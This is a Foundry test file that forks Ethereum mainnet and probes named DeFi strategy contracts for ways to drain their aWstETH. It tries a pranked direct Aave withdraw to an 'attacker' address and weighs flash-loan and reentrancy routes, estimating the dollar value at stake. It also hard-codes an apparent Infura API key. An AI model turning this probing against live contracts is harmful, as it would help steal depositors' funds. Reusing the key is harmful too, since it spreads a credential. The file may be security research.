// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IAavePool {
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

contract AaveActionExploit is Test {
    address constant ACTION_REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;
    
    bytes4 constant AAVE_WITHDRAW_ID = 0x72a6498a;
    
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeAaveWithdrawBytecode() public view {
        console.log("=== ANALYZING AAVE WITHDRAW ACTION BYTECODE ===\n");
        
        address aaveWithdrawAction = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_WITHDRAW_ID);
        console.log("AaveV3Withdraw action:", aaveWithdrawAction);
        
        bytes memory code = aaveWithdrawAction.code;
        console.log("Code size:", code.length);
        
        // Look for specific patterns in bytecode
        // The action likely:
        // 1. Decodes parameters from calldata
        // 2. Calls aavePool.withdraw(asset, amount, to)
        
        // Check for pool.withdraw selector: 0x69328dec
        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,uint256,address)"));
        console.log("Aave withdraw selector:");
        console.logBytes4(withdrawSelector);
        
        // Search for this selector in bytecode
        bool foundSelector = false;
        for (uint i = 0; i < code.length - 4; i++) {
            bytes4 b = bytes4(bytes32(bytes.concat(code[i], code[i+1], code[i+2], code[i+3])));
            if (b == withdrawSelector) {
                foundSelector = true;
                console.log("Found withdraw selector at position:", i);
                break;
            }
        }
        if (!foundSelector) {
            console.log("Withdraw selector not found in bytecode directly");
            console.log("(May be computed or stored differently)");
        }
    }
    
    function test_DirectAaveWithdrawCall() public {
        console.log("=== TESTING DIRECT AAVE WITHDRAW ===\n");
        
        // If we can call Aave's pool.withdraw() as Strategy,
        // we can drain all aWstETH
        
        uint256 strategyATokens = IERC20(aWstETH).balanceOf(STRATEGY_0);
        console.log("Strategy 0 aWstETH:", strategyATokens / 1e18);
        console.log("Value: ~$", (strategyATokens / 1e18) * 2300);
        
        // The key question: can we make Strategy call pool.withdraw(wstETH, amount, attacker)?
        
        // Try pranking as Strategy to call Aave directly
        vm.startPrank(STRATEGY_0);
        
        try IAavePool(AAVE_POOL).withdraw(wstETH, 1 ether, attacker) returns (uint256 withdrawn) {
            console.log("CRITICAL: Withdraw succeeded!");
            console.log("Withdrawn:", withdrawn);
            console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        } catch Error(string memory reason) {
            console.log("Withdraw failed:", reason);
        } catch {
            console.log("Withdraw failed (low level)");
        }
        
        vm.stopPrank();
        
        // Now check if attacker received tokens
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH balance:", attackerWstETH);
    }
    
    function test_AnalyzeActionInterface() public view {
        console.log("=== ANALYZING ACTION INTERFACE ===\n");
        
        // DeFiSaver actions typically have:
        // function executeAction(bytes memory _callData, bytes32[] memory _subData, uint8[] memory _paramMapping, bytes32[] memory _returnValues)
        
        // Or simpler:
        // function executeAction(bytes memory _callData, uint8[] memory _paramMapping)
        
        // The _paramMapping determines where each parameter comes from:
        // 0 = use direct value from _callData
        // 1-255 = use return value from action at that index
        // Special values for address(this), msg.sender, etc.
        
        // Check the action's function selector
        address aaveWithdrawAction = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_WITHDRAW_ID);
        
        // Try to identify the interface
        bytes memory code = aaveWithdrawAction.code;
        
        // executeAction selector
        bytes4 executeActionSelector = bytes4(keccak256("executeAction(bytes,bytes32[],uint8[],bytes32[])"));
        console.log("executeAction selector:");
        console.logBytes4(executeActionSelector);
        
        // executeActionDirect selector (no return values)
        bytes4 executeActionDirectSelector = bytes4(keccak256("executeActionDirect(bytes)"));
        console.log("executeActionDirect selector:");
        console.logBytes4(executeActionDirectSelector);
    }
    
    function test_ExploitViaFlashLoan() public {
        console.log("=== FLASH LOAN ATTACK ANALYSIS ===\n");
        
        // What if we flash loan, somehow get Strategy to execute an action
        // that sends tokens to us, then repay?
        
        // The problem: Strategy.callExecute() requires msg.sender == strategyExecutor
        // And StrategyExecutor.executeOnStrategy() requires executor whitelist
        
        // BUT: what if there's a callback somewhere that we can exploit?
        
        // Check if Strategy has any receive/fallback that does something interesting
        bytes memory strategyCode = STRATEGY_0.code;
        console.log("Strategy code size:", strategyCode.length);
        
        // Check for fallback/receive patterns
        // fallback() selector is usually at the end or uses specific pattern
        
        // Also check if Strategy implements any callback interfaces
        // like IFlashLoanReceiver, UniswapV3SwapCallback, etc.
        
        // Common flash loan callback: executeOperation(address[],uint256[],uint256[],address,bytes)
        bytes4 aaveFlashCallback = bytes4(keccak256("executeOperation(address[],uint256[],uint256[],address,bytes)"));
        console.log("Aave flash callback selector:");
        console.logBytes4(aaveFlashCallback);
    }
    
    function test_ExploitViaReentrancy() public {
        console.log("=== REENTRANCY ANALYSIS ===\n");
        
        // What if during an action execution, we can reenter?
        // Actions make external calls to Aave, Lido, etc.
        // If any of these have hooks/callbacks, we might reenter
        
        // stETH has the rebasing mechanism
        // wstETH wraps/unwraps stETH
        // aWstETH is an Aave token
        
        // None of these typically have attacker-controllable callbacks
        
        console.log("No obvious reentrancy vectors identified");
        console.log("aWstETH, wstETH, stETH don't have hooks");
    }
    
    function test_AnalyzeAllStrategies() public view {
        console.log("=== ALL STRATEGIES ANALYSIS ===\n");
        
        address[4] memory strategies = [
            0x60d2D94aCB969CA54e781007eE89F04c1A2e5943,
            0x5aE0e44DE96885702bD99A6914751C952d284938,
            0xB27D688Ac06a441c005657971B11521e80CdcE98,
            0xbfdF0aF6Df48E645Bd076802B95DDEf0b1E02a9d
        ];
        
        for (uint i = 0; i < strategies.length; i++) {
            console.log("\n--- Strategy", i, "---");
            console.log("Address:", strategies[i]);
            
            uint256 aBalance = IERC20(aWstETH).balanceOf(strategies[i]);
            uint256 wBalance = IERC20(wstETH).balanceOf(strategies[i]);
            
            console.log("aWstETH:", aBalance);
            console.log("wstETH:", wBalance);
            
            if (aBalance > 1e18) {
                console.log("VALUE: ~$", (aBalance / 1e18) * 2300);
            }
        }
    }
}
